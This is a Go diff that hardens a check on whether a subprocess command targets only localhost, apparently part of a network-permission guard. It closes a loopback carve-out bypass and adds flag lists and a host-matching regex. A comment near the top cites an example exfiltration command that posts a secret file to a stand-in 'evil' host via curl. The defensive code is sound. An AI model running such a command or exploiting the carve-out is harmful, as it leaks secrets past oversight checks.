@@ -817,14 +817,82 @@ func normalizeNetworkEffectHost(target string) string {
 	return host
 }
 
+// subprocessTargetsLocalhost reports whether every network target in the
+// command is provably loopback: at least one loopback token and no token that
+// is (or could expand to) a non-loopback host. A single loopback token used to
+// be enough, so "curl -e http://localhost -d @secret https://evil" rode the
+// loopback carve-out; any other URL — even a flag value such as a referer or
+// --proxy — or a whole-word "$"/backtick expansion now voids it.
 func subprocessTargetsLocalhost(command string) bool {
 	fields := splitShellFields(command)
-	for _, token := range fields[1:] {
+	sawLoopback := false
+	for i, token := range fields[1:] {
 		if isLocalhostSubprocessToken(token) {
-			return true
+			sawLoopback = true
+			continue
+		}
+		// fields[i] is the previous word: a value given to a data flag
+		// (-H "Authorization: $TOKEN", -u "$USER:$PASS") is sent to the
+		// target, not a target itself.
+		if loopbackDataValueFlags[fields[i]] && !strings.Contains(token, "://") {
+			continue
+		}
+		if isPossibleRemoteTargetToken(token) {
+			return false
 		}
 	}
-	return false
+	return sawLoopback
+}
+
+// loopbackDataValueFlags are curl/wget/httpie flags whose value is request
+// data or local output, never a network target (unlike -x/--proxy, -e).
+var loopbackDataValueFlags = map[string]bool{
+	"-H": true, "--header": true,
+	"-u": true, "--user": true,
+	"-d": true, "--data": true, "--data-raw": true, "--data-binary": true, "--data-urlencode": true, "--json": true,
+	"-F": true, "--form": true,
+	"-b": true, "--cookie": true,
+	"-A": true, "--user-agent": true,
+	"-o": true, "--output": true,
+	"-w": true, "--write-out": true,
+	"-X": true, "--request": true,
+}
+
+// possibleHostToken matches a scheme-less host[:port][/path] word such as
+// "example.com" or "10.0.0.1:8080/x" (userinfo already stripped).
+var possibleHostToken = regexp.MustCompile(`^[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+(:[0-9]+)?(/.*)?$`)
+
+// isPossibleRemoteTargetToken reports whether a non-loopback token could name
+// a network target: any URL, anything a shell expansion could turn into one,
+// or a scheme-less dotted host. Flags, paths and plain numbers (e.g. the
+// "1.5" of --max-time) are not targets.
+func isPossibleRemoteTargetToken(token string) bool {
+	t := strings.Trim(token, `"'<>`)
+	// A whole-word expansion ($URL, "$2", ${X}, $(cmd), `cmd`) could be the
+	// target itself. An expansion embedded in other text (a header value, a
+	// query string, user:$PASS) is data, and data sent to loopback stays
+	// on-host.
+	if strings.Contains(t, "://") || strings.HasPrefix(t, "$") || strings.HasPrefix(t, "`") {
+		return true
+	}
+	if t == "" || strings.HasPrefix(t, "-") {
+		return false
+	}
+	if at := strings.LastIndex(t, "@"); at >= 0 {
+		t = t[at+1:]
+	}
+	if !possibleHostToken.MatchString(t) {
+		return false
+	}
+	host := t
+	if cut := strings.IndexAny(host, ":/"); cut >= 0 {
+		host = host[:cut]
+	}
+	// A bare decimal like "1.5" is a number, not a host; a dotted quad is an IP.
+	if strings.Trim(host, "0123456789.") == "" && strings.Count(host, ".") != 3 {
+		return false
+	}
+	return true
 }
 
 func isLocalhostSubprocessToken(token string) bool {
